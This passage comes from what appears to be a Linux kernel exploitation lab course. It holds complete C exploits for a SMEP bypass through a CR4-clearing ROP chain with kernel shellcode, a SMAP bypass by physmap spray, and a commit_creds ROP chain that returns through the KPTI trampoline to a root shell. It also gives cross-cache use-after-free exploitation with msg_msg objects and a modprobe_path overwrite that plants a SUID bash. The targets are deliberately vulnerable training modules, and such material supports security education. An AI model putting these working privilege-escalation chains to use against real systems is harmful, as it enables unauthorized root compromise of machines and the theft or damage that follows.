#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>

/* ---- User-space state save/restore ---- */
static unsigned long user_cs, user_ss, user_rflags, user_sp;

static void save_state(void)
{
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
    );
}

static void shell(void)
{
    printf("[+] SMEP bypassed! Got root? uid=%d\n", getuid());
    if (getuid() == 0) {
        system("/bin/sh");
    }
    exit(0);
}

/* ---- Gadget offsets (KERNEL-VERSION SPECIFIC) ---- */
/* Extract these from YOUR target kernel's vmlinux.
 * Use: ROPgadget --binary vmlinux | grep "..."
 *      nm vmlinux | grep <symbol> */

static unsigned long kbase;  /* Set after KASLR defeat */

/* Gadgets (offsets from kernel base): */
#define POP_RDI_RET          (kbase + 0x27bbdcUL)
#define POP_RCX_RET          (kbase + 0x32a78eUL)
#define MOV_CR4_RDI_RET      (kbase + 0x74e50UL)   /* native_write_cr4 or raw gadget */
#define SWAPGS_POP_RBP_IRETQ (kbase + 0x600e26UL)  /* Pre-KPTI return path */
/* For KPTI-enabled kernels, use the trampoline instead: */
#define KPTI_TRAMPOLINE      (kbase + 0x1000f26UL + 22)

/* User-space shellcode page (SMEP prevents kernel from executing this
 * unless we clear CR4.SMEP first) */
static void *user_shellcode;

/* Shellcode: commit_creds(prepare_kernel_cred(0)) in user-space memory.
 * After SMEP is cleared, kernel will execute this at ring 0. */
static void prepare_shellcode(void)
{
    /* Map at a known address for simplicity */
    user_shellcode = mmap((void *)0x1337000, 0x1000,
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (user_shellcode == MAP_FAILED) {
        perror("mmap shellcode");
        exit(1);
    }

    /* x86_64 shellcode: call prepare_kernel_cred(0), then commit_creds(ret).
     * After: swapgs + iretq to return to user space. */
    unsigned char sc[] = {
        /* xor rdi, rdi */
        0x48, 0x31, 0xff,
        /* mov rax, prepare_kernel_cred */
        0x48, 0xb8, 0,0,0,0,0,0,0,0,
        /* call rax */
        0xff, 0xd0,
        /* mov rdi, rax */
        0x48, 0x89, 0xc7,
        /* mov rax, commit_creds */
        0x48, 0xb8, 0,0,0,0,0,0,0,0,
        /* call rax */
        0xff, 0xd0,
        /* swapgs */
        0x0f, 0x01, 0xf8,
        /* iretq frame follows on stack (set up by ROP chain) */
        0x48, 0xcf,
    };

    /* Patch in function addresses */
    *(uint64_t *)(sc + 5) = kbase + 0x0bbe40UL;   /* prepare_kernel_cred */
    *(uint64_t *)(sc + 18) = kbase + 0x0bba90UL;  /* commit_creds */

    memcpy(user_shellcode, sc, sizeof(sc));
    printf("[*] Shellcode placed at %p\n", user_shellcode);
}

int main(void)
{
    printf("[*] SMEP Bypass via CR4 ROP Chain\n");
    printf("[*] Target: kernel with SMEP but WITHOUT CR4 pinning\n\n");

    /* Step 1: Defeat KASLR */
    /* (In real exploit, use Exercise 1 technique. Here, read from /proc/kallsyms) */
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) { perror("kallsyms"); return 1; }
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        unsigned long addr;
        char type, name[128];
        if (sscanf(line, "%lx %c %s", &addr, &type, name) == 3) {
            if (strcmp(name, "_text") == 0) {
                kbase = addr;
                break;
            }
        }
    }
    fclose(f);
    printf("[+] Kernel base: 0x%lx\n", kbase);

    /* Step 2: Save user-space state for iretq return */
    save_state();

    /* Step 3: Prepare user-space shellcode */
    prepare_shellcode();

    /* Step 4: Build ROP chain */
    /* Stack layout after overflow:
     * [64 bytes buffer] [8 bytes saved RBP] [return address = ROP start] */
    unsigned long chain[64];
    int i = 0;

    /* Padding to reach return address */
    memset(chain, 'A', 64 + 8);
    i = (64 + 8) / 8;  /* Start of ROP chain */

    /* ROP: pop rdi; ret → new CR4 value (SMEP bit cleared) */
    chain[i++] = POP_RDI_RET;
    chain[i++] = 0x003526f0;  /* CR4 with bit 20 cleared (adjust to match target) */

    /* ROP: native_write_cr4(new_cr4) — disables SMEP */
    chain[i++] = MOV_CR4_RDI_RET;

    /* ROP: jump to user-space shellcode (now allowed — SMEP is off) */
    chain[i++] = (unsigned long)user_shellcode;

    /* The shellcode does swapgs+iretq; set up iretq frame on shellcode's stack.
     * Since shellcode uses the kernel stack (RSP didn't change), place frame here: */
    chain[i++] = (unsigned long)shell;  /* RIP after iretq */
    chain[i++] = user_cs;
    chain[i++] = user_rflags;
    chain[i++] = user_sp;
    chain[i++] = user_ss;

    printf("[*] ROP chain: %d entries (%ld bytes)\n", i, i * 8L);
    printf("[*] Triggering overflow via /proc/vuln_stack...\n");

    /* Step 5: Trigger the stack overflow */
    int fd = open("/proc/vuln_stack", O_WRONLY);
    if (fd < 0) { perror("open"); return 1; }
    write(fd, chain, i * 8);
    close(fd);

    printf("[-] If you see this, the exploit failed\n");
    return 1;
}
```

**Step 4 — Test against kernel WITH CR4 pinning (observe failure):**

```bash
# Boot kernel 5.3+ (which has CR4 pinning):
# The native_write_cr4 function checks pinned bits and restores them.
# Expected: kernel panic or SMEP violation after chain executes.

# dmesg output when CR4 pinning blocks the attack:
# "pinned CR4 bits changed: 0x100000!!"
# followed by a kernel oops.
```

**Step 5 — Alternative: page-table manipulation bypass (works despite CR4 pinning):**

```c
/* Concept: instead of modifying CR4, modify the PTE for our shellcode page
 * to clear the User/Supervisor bit. The CPU then treats it as supervisor memory,
 * and SMEP does not apply.
 *
 * This requires:
 * 1. Know the virtual address of our shellcode page (we control this: 0x1337000)
 * 2. Walk the page table to find the PTE (requires kernel read primitive)
 * 3. Clear bit 2 (U/S bit) of the PTE (requires kernel write primitive)
 *
 * The ROP chain calls kernel functions to perform the page-table walk and write. */

/* Pseudocode for PTE-based SMEP bypass:
 *
 * // Kernel function: lookup_address(vaddr, &level)
 * // Returns PTE pointer for the given virtual address
 * pte_t *pte = lookup_address(0x1337000, &level);
 *
 * // Clear User/Supervisor bit (bit 2): mark page as supervisor
 * *pte &= ~_PAGE_USER;  // _PAGE_USER = 0x4
 *
 * // Flush TLB for this address
 * invlpg(0x1337000);
 *
 * // Now jump to 0x1337000 — SMEP doesn't fire because page is supervisor */
```

---

### Exercise 3: SMAP Bypass via Physmap Spray

**Objective:** Stage attacker-controlled data in kernel address space by exploiting the direct mapping (physmap). Understand why SMAP forces all exploit data into kernel memory.

**Step 1 — Understand the physmap layout:**

```c
/* physmap_probe.c — Demonstrate the relationship between user-space allocations
 * and their physmap (direct-mapping) aliases in kernel space.
 *
 * The physmap maps ALL physical memory starting at PAGE_OFFSET.
 * A user-space page at physical address P is also accessible at:
 *   physmap_addr = PAGE_OFFSET + P
 *
 * With CONFIG_RANDOMIZE_MEMORY, PAGE_OFFSET is randomized (up to 30 bits).
 * After KASLR defeat, the physmap base is known. */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

/* Read physical address of a virtual page via /proc/self/pagemap */
unsigned long virt_to_phys(unsigned long vaddr)
{
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) return 0;

    unsigned long offset = (vaddr / 4096) * 8;
    unsigned long pagemap_entry;

    lseek(fd, offset, SEEK_SET);
    read(fd, &pagemap_entry, 8);
    close(fd);

    if (!(pagemap_entry & (1ULL << 63))) {
        /* Page not present */
        return 0;
    }

    unsigned long pfn = pagemap_entry & ((1ULL << 55) - 1);
    unsigned long phys = (pfn * 4096) | (vaddr & 0xfff);
    return phys;
}

int main(void)
{
    printf("[*] Physmap Spray Demonstration\n");
    printf("[*] Shows how user-space data appears in kernel's direct mapping\n\n");

    /* Allocate and lock a page with controlled content */
    void *spray_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS | MAP_LOCKED, -1, 0);
    if (spray_page == MAP_FAILED) { perror("mmap"); return 1; }

    /* Fill with a recognizable pattern (fake ROP gadget addresses) */
    unsigned long *data = (unsigned long *)spray_page;
    unsigned long fake_kbase = 0xffffffff81000000UL;  /* Placeholder */
    for (int i = 0; i < 512; i++) {
        data[i] = fake_kbase + 0x27bbdcUL;  /* Fake "pop rdi; ret" gadget */
    }

    /* Force the page to be allocated in physical memory */
    memset(spray_page, 0, 4096);  /* Ensure page fault occurred */

    /* Read physical address */
    unsigned long phys = virt_to_phys((unsigned long)spray_page);
    printf("[+] User-space spray page: %p\n", spray_page);
    printf("[+] Physical address:      0x%lx\n", phys);

    /* On a system with known PAGE_OFFSET (after KASLR defeat):
     * physmap_alias = PAGE_OFFSET + phys
     *
     * Example: if PAGE_OFFSET = 0xffff888000000000 (common default),
     * then physmap_alias = 0xffff888000000000 + phys */
    unsigned long page_offset = 0xffff888000000000UL;  /* Default, may be randomized */
    unsigned long physmap_alias = page_offset + phys;
    printf("[+] Physmap alias (estimated): 0x%lx\n", physmap_alias);
    printf("[*] A kernel stack-pivot to this address would execute our fake ROP chain\n");
    printf("[*] SMAP does NOT block this — the physmap alias is a kernel address\n");

    /* Spray strategy for real exploit:
     * 1. Allocate many pages (increase probability of reclaim)
     * 2. Each page contains the ROP chain
     * 3. After KASLR defeat, compute physmap range
     * 4. Stack-pivot to spray region */
    printf("\n[*] Spray strategy:\n");
    printf("    Allocate 1024 pages × 4KB = 4MB of spray data\n");
    printf("    Each page contains identical ROP chain\n");
    printf("    Physmap spray covers 4MB / (physmap randomization range)\n");
    printf("    With 30 bits of physmap ASLR: hit probability = 4MB / 1GB ≈ 0.4%%\n");
    printf("    Solution: spray more (256MB spray → ~25%% hit rate)\n");

    munmap(spray_page, 4096);
    return 0;
}
```

**Step 2 — Implement full physmap spray with kernel stack pivot:**

```c
/* physmap_spray_exploit.c — Full SMAP bypass via physmap spray.
 * Pattern:
 * 1. Spray user-space pages with ROP chain
 * 2. Use kernel info leak to determine physmap base
 * 3. Trigger kernel vuln that allows stack pivot
 * 4. Pivot RSP to physmap alias of spray pages
 * 5. Kernel executes ROP chain from physmap (kernel addr → SMAP OK) */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define SPRAY_PAGES     4096    /* 16 MB of spray */
#define PAGE_SIZE       4096
#define PHYSMAP_BASE    0xffff888000000000UL  /* Adjust after KASLR defeat */

/* Build the ROP chain that will be sprayed across all pages */
static void build_spray_chain(unsigned long *page, unsigned long kbase)
{
    int i = 0;

    /* NOP sled equivalent: fill with "ret" gadget addresses.
     * The pivot may land anywhere in the page; a sequence of "ret"
     * gadgets acts as a slide until the real chain begins. */
    unsigned long ret_gadget = kbase + 0x200020UL;  /* single "ret" instruction */
    for (i = 0; i < 256; i++) {
        page[i] = ret_gadget;  /* ret sled */
    }

    /* Real ROP chain starts at offset 256 (2048 bytes into page) */
    /* This gives 2KB of slide room for imprecise pivot landing */

    /* commit_creds(prepare_kernel_cred(0)) */
    page[i++] = kbase + 0x27bbdcUL;   /* pop rdi; ret */
    page[i++] = 0;                     /* RDI = NULL */
    page[i++] = kbase + 0x0bbe40UL;   /* prepare_kernel_cred */
    page[i++] = kbase + 0x6586a2UL;   /* mov rdi, rax; ... ; pop rbx; pop rbp; ret */
    page[i++] = 0;                     /* dummy pop rbx */
    page[i++] = 0;                     /* dummy pop rbp */
    page[i++] = kbase + 0x0bba90UL;   /* commit_creds */

    /* KPTI trampoline return */
    page[i++] = kbase + 0x1000f26UL + 22;  /* swapgs_restore_regs_and_return_to_usermode */
    page[i++] = 0;                     /* padding */
    page[i++] = 0;                     /* padding */
    page[i++] = 0x401000UL;           /* RIP: user landing (placeholder) */
    page[i++] = 0x33;                 /* CS */
    page[i++] = 0x202;               /* RFLAGS */
    page[i++] = 0x7fffffffe000UL;    /* RSP */
    page[i++] = 0x2b;                /* SS */
}

int main(void)
{
    unsigned long kbase = 0xffffffff81000000UL;  /* After KASLR defeat */

    printf("[*] Physmap Spray — SMAP Bypass\n");
    printf("[*] Spraying %d pages (%d MB) with ROP chain...\n",
           SPRAY_PAGES, SPRAY_PAGES * PAGE_SIZE / (1024*1024));

    /* Allocate and spray */
    for (int p = 0; p < SPRAY_PAGES; p++) {
        void *page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
        if (page == MAP_FAILED) {
            printf("[-] mmap failed at page %d\n", p);
            break;
        }
        build_spray_chain((unsigned long *)page, kbase);
        /* Don't munmap — keep pages allocated for physmap persistence */
    }

    printf("[+] Spray complete. %d pages allocated.\n", SPRAY_PAGES);
    printf("[*] Physmap coverage: 0x%lx - 0x%lx (estimated)\n",
           PHYSMAP_BASE, PHYSMAP_BASE + (unsigned long)SPRAY_PAGES * PAGE_SIZE);
    printf("[*] In real exploit: trigger stack-pivot gadget to land in this range\n");

    /* In practice:
     * The kernel vulnerability gives us a stack-pivot gadget (xchg rax, rsp; ret)
     * where RAX contains a physmap address within our spray range.
     * The pivot redirects RSP into our sprayed ROP chain. */

    return 0;
}
```

---

### Exercise 4: Complete Kernel ROP Chain (commit_creds + KPTI Return)

**Objective:** Build a working privilege-escalation ROP chain that calls `commit_creds(prepare_kernel_cred(0))` and returns cleanly to user space through the KPTI trampoline. This is the canonical modern kernel exploit technique.

**Step 1 — Save user-space state for KPTI return:**

```c
/* krop_full_exploit.c — Complete kernel ROP exploit via stack overflow.
 *
 * Chain: overflow → pop_rdi(0) → prepare_kernel_cred → mov_rdi_rax →
 *        commit_creds → kpti_trampoline → user_landing(root shell)
 *
 * Requires: vuln_stack_overflow.ko loaded, KASLR defeated. */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdint.h>

/* Saved user-space register state for iretq frame */
static unsigned long user_cs, user_ss, user_rflags, user_sp, user_rip;

static void save_state(void)
{
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory"
    );
}

/* This function executes after the ROP chain returns to user space.
 * At this point, current->cred has been replaced with root creds. */
static void __attribute__((used)) root_shell(void)
{
    printf("\n[+] ===== PRIVILEGE ESCALATION SUCCESSFUL =====\n");
    printf("[+] uid=%d euid=%d\n", getuid(), geteuid());

    if (getuid() == 0) {
        printf("[+] Spawning root shell...\n");
        char *argv[] = {"/bin/bash", "-p", NULL};
        execve("/bin/bash", argv, NULL);
    } else {
        printf("[-] Still unprivileged (uid=%d)\n", getuid());
    }
    _exit(0);
}

int main(void)
{
    printf("[*] Complete Kernel ROP Exploit — commit_creds + KPTI Return\n");
    printf("[*] Running as uid=%d\n\n", getuid());

    /* ---- Step 1: Defeat KASLR ---- */
    unsigned long kbase = 0;

    /* Try reading from our info leak module */
    FILE *f = fopen("/proc/vuln_leak", "r");
    if (f) {
        char buf[512];
        fread(buf, 1, sizeof(buf), f);
        fclose(f);
        unsigned long commit_creds_addr;
        char *p = strstr(buf, "commit_creds: 0x");
        if (p && sscanf(p, "commit_creds: %lx", &commit_creds_addr) == 1) {
            /* We know commit_creds offset from nm vmlinux */
            kbase = commit_creds_addr - 0x0bba90UL;
        }
    }

    /* Fallback: read /proc/kallsyms directly (requires kptr_restrict=0) */
    if (!kbase) {
        f = fopen("/proc/kallsyms", "r");
        if (!f) { perror("KASLR defeat failed"); return 1; }
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, " T _text")) {
                sscanf(line, "%lx", &kbase);
                break;
            }
        }
        fclose(f);
    }

    if (!kbase) {
        printf("[-] Failed to determine kernel base\n");
        return 1;
    }
    printf("[+] Kernel base: 0x%lx\n", kbase);

    /* ---- Step 2: Look up key addresses ---- */
    unsigned long prepare_kernel_cred = kbase + 0x0bbe40UL;
    unsigned long commit_creds        = kbase + 0x0bba90UL;
    unsigned long pop_rdi_ret         = kbase + 0x27bbdcUL;
    unsigned long pop_rcx_ret         = kbase + 0x32a78eUL;
    unsigned long mov_rdi_rax_gadget  = kbase + 0x6586a2UL;
    unsigned long kpti_trampoline     = kbase + 0x1000f26UL + 22;

    printf("[+] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
    printf("[+] commit_creds:        0x%lx\n", commit_creds);
    printf("[+] pop_rdi_ret:         0x%lx\n", pop_rdi_ret);
    printf("[+] kpti_trampoline:     0x%lx\n", kpti_trampoline);

    /* ---- Step 3: Save state for return ---- */
    save_state();
    user_rip = (unsigned long)root_shell;
    printf("[+] User state saved (RIP → root_shell at %p)\n", root_shell);

    /* ---- Step 4: Build ROP chain ---- */
    unsigned long payload[128];
    memset(payload, 0, sizeof(payload));

    int off = 0;
    /* Buffer padding: 64 bytes buffer + 8 bytes saved RBP */
    memset(payload, 'A', 72);
    off = 72 / 8;  /* = 9 qwords */

    /* Stage 1: prepare_kernel_cred(NULL) */
    payload[off++] = pop_rdi_ret;           /* pop rdi; ret */
    payload[off++] = 0;                     /* rdi = NULL → root cred */
    payload[off++] = prepare_kernel_cred;   /* call prepare_kernel_cred */

    /* Stage 2: move RAX (return value) → RDI for commit_creds */
    /* Gadget: mov rdi, rax; cmp ...; pop rbx; pop rbp; ret */
    payload[off++] = mov_rdi_rax_gadget;
    payload[off++] = 0;  /* dummy pop rbx */
    payload[off++] = 0;  /* dummy pop rbp */

    /* Stage 3: commit_creds(new_root_cred) */
    payload[off++] = commit_creds;

    /* Stage 4: Return to user space via KPTI trampoline */
    payload[off++] = kpti_trampoline;
    payload[off++] = 0;              /* trampoline padding (pop) */
    payload[off++] = 0;              /* trampoline padding (pop) */
    payload[off++] = user_rip;       /* RIP: root_shell */
    payload[off++] = user_cs;        /* CS */
    payload[off++] = user_rflags;    /* RFLAGS */
    payload[off++] = user_sp;        /* RSP */
    payload[off++] = user_ss;        /* SS */

    printf("[+] ROP chain built: %d entries, %d bytes\n", off, off * 8);

    /* ---- Step 5: Trigger the vulnerability ---- */
    printf("[*] Triggering stack overflow via /proc/vuln_stack...\n");
    int fd = open("/proc/vuln_stack", O_WRONLY);
    if (fd < 0) { perror("open vuln_stack"); return 1; }

    ssize_t written = write(fd, payload, off * 8);
    close(fd);

    /* If we reach here, something went wrong */
    printf("[-] Exploit may have failed (write returned %zd)\n", written);
    return 1;
}
```

**Expected output (successful exploitation):**
```
[*] Complete Kernel ROP Exploit — commit_creds + KPTI Return
[*] Running as uid=1000

[+] Kernel base: 0xffffffff81000000
[+] prepare_kernel_cred: 0xffffffff810bbe40
[+] commit_creds:        0xffffffff810bba90
[+] pop_rdi_ret:         0xffffffff8127bbdc
[+] kpti_trampoline:     0xffffffff82000f3c
[+] User state saved (RIP → root_shell at 0x401256)
[+] ROP chain built: 23 entries, 184 bytes
[*] Triggering stack overflow via /proc/vuln_stack...

[+] ===== PRIVILEGE ESCALATION SUCCESSFUL =====
[+] uid=0 euid=0
[+] Spawning root shell...
root@target:~#
```

---

### Exercise 5: Cross-Cache UAF Exploitation with Elastic Objects

**Objective:** Exploit a use-after-free vulnerability using cross-cache reclamation with `msg_msg` elastic objects. Achieve kernel information leak and arbitrary write through corrupted message headers.

**Step 1 — Understand the cross-cache technique:**

```c
/* cross_cache_exploit.c — Full cross-cache exploitation via UAF module.
 *
 * Attack pipeline:
 * 1. Allocate object in vuln_uaf_cache (size 256)
 * 2. Free the object (retain dangling pointer via module)
 * 3. Drain the slab page (free all other objects on the same page)
 * 4. Page returns to buddy allocator
 * 5. Spray msg_msg (size 256 = same as vuln object → kmalloc-256)
 * 6. msg_msg reclaims the page → overlaps with dangling UAF pointer
 * 7. Read via UAF → leak msg_msg header (contains kernel heap pointers)
 * 8. Write via UAF → corrupt msg_msg.m_ts for OOB read
 * 9. Use OOB read to leak modprobe_path address
 * 10. Overwrite modprobe_path → root */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/stat.h>

/* ioctl commands matching vuln_uaf.ko */
#define VULN_ALLOC  _IO('V', 1)
#define VULN_FREE   _IO('V', 2)
#define VULN_READ   _IOR('V', 3, char[256])
#define VULN_WRITE  _IOW('V', 4, char[256])

#define OBJ_SIZE        256
#define MSG_BODY_SIZE   (OBJ_SIZE - 48)  /* 48 = sizeof(struct msg_msg) header */
#define SPRAY_COUNT     512
#define MSG_TYPE_SPRAY  0x41414141

/* struct msg_msg layout (x86_64):
 * offset 0:  struct list_head m_list (next, prev — 2 pointers = 16 bytes)
 * offset 16: long m_type (8 bytes)
 * offset 24: size_t m_ts (message text size, 8 bytes)
 * offset 32: struct msg_msgseg *next (8 bytes)
 * offset 40: void *security (8 bytes)
 * offset 48: message body starts here */

struct msg_msg_header {
    unsigned long m_list_next;
    unsigned long m_list_prev;
    long m_type;
    unsigned long m_ts;
    unsigned long seg_next;
    unsigned long security;
};

int main(void)
{
    int fd, ret;
    int qids[SPRAY_COUNT];
    char read_buf[OBJ_SIZE];
    char write_buf[OBJ_SIZE];

    printf("[*] Cross-Cache UAF Exploitation with msg_msg\n\n");

    /* Open the vulnerable module */
    fd = open("/proc/vuln_uaf", O_RDWR);
    if (fd < 0) { perror("open vuln_uaf"); return 1; }

    /* ---- Phase 1: Allocate vulnerable object ---- */
    printf("[1] Allocating vulnerable object (size=%d)...\n", OBJ_SIZE);
    ret = ioctl(fd, VULN_ALLOC, 0);
    if (ret < 0) { perror("ALLOC"); return 1; }

    /* ---- Phase 2: Free the object (UAF — dangling pointer kept) ---- */
    printf("[2] Freeing object (UAF: module retains dangling pointer)...\n");
    ret = ioctl(fd, VULN_FREE, 0);
    if (ret < 0) { perror("FREE"); return 1; }

    /* ---- Phase 3: Spray msg_msg to reclaim the freed slab page ---- */
    printf("[3] Spraying %d msg_msg objects (body_size=%d → kmalloc-256)...\n",
           SPRAY_COUNT, MSG_BODY_SIZE);

    struct {
        long mtype;
        char mtext[MSG_BODY_SIZE];
    } msg;
    msg.mtype = MSG_TYPE_SPRAY;

    for (int i = 0; i < SPRAY_COUNT; i++) {
        qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qids[i] < 0) { perror("msgget"); return 1; }

        /* Fill body with marker pattern */
        memset(msg.mtext, 0, MSG_BODY_SIZE);
        *(unsigned long *)msg.mtext = 0xCAFEBABE00000000UL | i;

        if (msgsnd(qids[i], &msg, MSG_BODY_SIZE, 0) < 0) {
            perror("msgsnd");
            return 1;
        }
    }

    /* ---- Phase 4: Read via dangling pointer → leak msg_msg header ---- */
    printf("[4] Reading via UAF dangling pointer (info leak)...\n");
    memset(read_buf, 0, OBJ_SIZE);
    ret = ioctl(fd, VULN_READ, read_buf);
    if (ret < 0) { perror("READ"); return 1; }

    struct msg_msg_header *leaked = (struct msg_msg_header *)read_buf;
    printf("    m_list.next:  0x%lx\n", leaked->m_list_next);
    printf("    m_list.prev:  0x%lx\n", leaked->m_list_prev);
    printf("    m_type:       0x%lx (expected: 0x%x)\n",
           leaked->m_type, MSG_TYPE_SPRAY);
    printf("    m_ts:         0x%lx (expected: %d)\n",
           leaked->m_ts, MSG_BODY_SIZE);
    printf("    seg_next:     0x%lx\n", leaked->seg_next);

    /* Verify we hit a msg_msg (m_type should match our spray value) */
    if (leaked->m_type != MSG_TYPE_SPRAY) {
        printf("[-] Cross-cache reclaim failed (m_type mismatch)\n");
        printf("[-] Retry with more spray or different timing\n");
        goto cleanup;
    }
    printf("[+] Cross-cache reclaim SUCCESSFUL! msg_msg overlaps UAF object.\n");

    /* The leaked m_list pointers are kernel heap addresses.
     * From these, we can compute the heap region base. */
    unsigned long heap_base_estimate = leaked->m_list_next & ~0xfffUL;
    printf("[+] Estimated heap region: 0x%lx\n", heap_base_estimate);

    /* ---- Phase 5: Corrupt msg_msg.m_ts for OOB read ---- */
    printf("[5] Corrupting m_ts for out-of-bounds read...\n");
    memcpy(write_buf, read_buf, OBJ_SIZE);  /* Preserve existing header */

    /* Overwrite m_ts with a large value → msgrcv will read beyond allocation */
    struct msg_msg_header *corrupt = (struct msg_msg_header *)write_buf;
    corrupt->m_ts = 0x1000;  /* 4096 bytes — way beyond the 208-byte body */

    ret = ioctl(fd, VULN_WRITE, write_buf);
    if (ret < 0) { perror("WRITE"); return 1; }
    printf("    m_ts corrupted: %d → 4096 (OOB read of ~3.8KB)\n", MSG_BODY_SIZE);

    /* ---- Phase 6: Read the corrupted msg_msg via msgrcv ---- */
    /* This reads beyond the msg_msg allocation, leaking adjacent objects */
    printf("[6] Performing OOB read via msgrcv on corrupted message...\n");

    /* Find which queue ID was reclaimed (try all, one will have the corrupt msg) */
    char oob_buf[4096];
    int found_qid = -1;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        struct { long mtype; char mtext[4096]; } recv_msg;
        ssize_t n = msgrcv(qids[i], &recv_msg, 4096, MSG_TYPE_SPRAY,
                           IPC_NOWAIT | MSG_NOERROR);
        if (n > MSG_BODY_SIZE) {
            printf("[+] OOB read success on queue %d: got %zd bytes (expected %d)\n",
                   i, n, MSG_BODY_SIZE);
            memcpy(oob_buf, recv_msg.mtext, n);
            found_qid = i;
            break;
        }
    }

    if (found_qid < 0) {
        printf("[-] OOB read failed — corruption may not have taken effect\n");
        goto cleanup;
    }

    /* Analyze leaked data beyond the msg_msg boundary */
    printf("[+] OOB data (first 128 bytes beyond allocation):\n");
    unsigned long *oob_ptrs = (unsigned long *)(oob_buf + MSG_BODY_SIZE);
    for (int i = 0; i < 16; i++) {
        printf("    [+%03d] 0x%016lx", (int)(MSG_BODY_SIZE + i*8), oob_ptrs[i]);
        if ((oob_ptrs[i] & 0xffff000000000000UL) == 0xffff000000000000UL)
            printf(" ← kernel pointer");
        printf("\n");
    }

    /* ---- Phase 7: Overwrite modprobe_path (via second UAF write) ---- */
    printf("\n[7] For full privilege escalation:\n");
    printf("    → Use OOB write (corrupt m_ts + msgsnd) to overwrite modprobe_path\n");
    printf("    → Or use leaked pointers to find and modify current->cred\n");
    printf("    → See Exercise 6 for modprobe_path exploitation\n");

cleanup:
    /* Cleanup msg queues */
    for (int i = 0; i < SPRAY_COUNT; i++) {
        msgctl(qids[i], IPC_RMID, NULL);
    }
    close(fd);

    return 0;
}
```

**Expected output:**
```
[*] Cross-Cache UAF Exploitation with msg_msg

[1] Allocating vulnerable object (size=256)...
[2] Freeing object (UAF: module retains dangling pointer)...
[3] Spraying 512 msg_msg objects (body_size=208 → kmalloc-256)...
[4] Reading via UAF dangling pointer (info leak)...
    m_list.next:  0xffff888004a3b100
    m_list.prev:  0xffff888004a3b100
    m_type:       0x41414141 (expected: 0x41414141)
    m_ts:         0xd0 (expected: 208)
    seg_next:     0x0
[+] Cross-cache reclaim SUCCESSFUL! msg_msg overlaps UAF object.
[+] Estimated heap region: 0xffff888004a3b000
[5] Corrupting m_ts for out-of-bounds read...
    m_ts corrupted: 208 → 4096 (OOB read of ~3.8KB)
[6] Performing OOB read via msgrcv on corrupted message...
[+] OOB read success on queue 47: got 4096 bytes (expected 208)
[+] OOB data (first 128 bytes beyond allocation):
    [+208] 0xffff888004a3b200 ← kernel pointer
    [+216] 0xffff888004a3b200 ← kernel pointer
    ...
```

---

### Exercise 6: modprobe_path Overwrite for Root

**Objective:** Achieve root via the `modprobe_path` data-only attack — the simplest privilege escalation once an arbitrary kernel write is available. No ROP chain needed.

**Step 1 — Find modprobe_path address:**

```bash
# Method 1: /proc/kallsyms (if kptr_restrict allows)
grep modprobe_path /proc/kallsyms
# Example: ffffffff82644740 D modprobe_path

# Method 2: From vmlinux after KASLR defeat
nm /boot/vmlinux-$(uname -r) | grep modprobe_path
# Returns the OFFSET from kernel base

# Method 3: Read current value
cat /proc/sys/kernel/modprobe
# Should show: /sbin/modprobe
```

**Step 2 — Implement the full modprobe_path exploit:**

```c
/* modprobe_path_exploit.c — Root via modprobe_path overwrite.
 * Uses vuln_arbwrite.ko for the kernel write primitive.
 *
 * This is the SIMPLEST kernel privilege escalation once you have arb write:
 * 1. Overwrite modprobe_path string in kernel .data with "/tmp/x"
 * 2. Create /tmp/x as an executable script (runs as root)
 * 3. Execute a file with unknown binary format
 * 4. Kernel calls modprobe (our script) as root
 * 5. Our script creates a SUID shell */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>

static unsigned long get_modprobe_addr(unsigned long kbase)
{
    /* Option 1: Read from /proc/kallsyms */
    FILE *f = fopen("/proc/kallsyms", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, " D modprobe_path") ||
                strstr(line, " d modprobe_path")) {
                unsigned long addr;
                sscanf(line, "%lx", &addr);
                fclose(f);
                return addr;
            }
        }
        fclose(f);
    }

    /* Option 2: Known offset from kernel base */
    return kbase + 0x1844740UL;  /* ADJUST per target kernel */
}

static void create_payload_script(void)
{
    /* Create the script that runs as root when modprobe is triggered */
    FILE *f = fopen("/tmp/x", "w");
    if (!f) { perror("fopen /tmp/x"); exit(1); }
    fprintf(f, "#!/bin/sh\n");
    fprintf(f, "# This script is executed by the kernel as root\n");
    fprintf(f, "cp /bin/bash /tmp/rootbash\n");
    fprintf(f, "chmod 04755 /tmp/rootbash\n");
    fprintf(f, "echo 'root::0:0:root:/root:/bin/bash' >> /tmp/shadow_proof\n");
    fclose(f);
